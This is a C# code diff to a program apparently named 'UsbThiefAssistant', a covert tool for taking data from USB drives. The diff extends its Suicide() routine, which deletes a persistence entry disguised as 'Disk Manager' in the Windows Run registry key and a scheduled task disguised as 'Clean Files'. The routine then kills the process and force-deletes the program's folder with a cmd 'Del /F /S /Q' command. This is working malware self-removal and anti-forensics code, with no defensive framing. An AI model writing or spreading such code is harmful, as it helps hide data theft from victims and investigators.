@@ -1,4 +1,6 @@
-﻿using System;
+﻿using Microsoft.Win32;
+using Microsoft.Win32.TaskScheduler;
+using System;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
@@ -156,6 +158,28 @@ namespace UsbThiefAssistant
         }
         private void Suicide()
         {
+            try
+            {
+                string p = Application.ExecutablePath;
+                RegistryKey rk = Registry.CurrentUser;
+                RegistryKey rk2 = rk.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
+                if (rk2.GetValue("Disk Manager") != null)
+                {
+                    rk2.DeleteValue("Disk Manager");
+                }
+                rk2.Close();
+                rk.Close();
+                if (TaskService.Instance.FindTask("Clean Files") != null)
+                {
+                    TaskService ts = new TaskService();
+                    TaskFolder tf = ts.RootFolder;
+                    tf.DeleteTask("Clean Files");
+                    ts.Dispose();
+                }
+            }
+            catch (Exception)
+            {
+            }
             string path = Application.StartupPath;
             KillProcess();
             ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/C timeout /T 5 & Del /F /S /Q " + path)
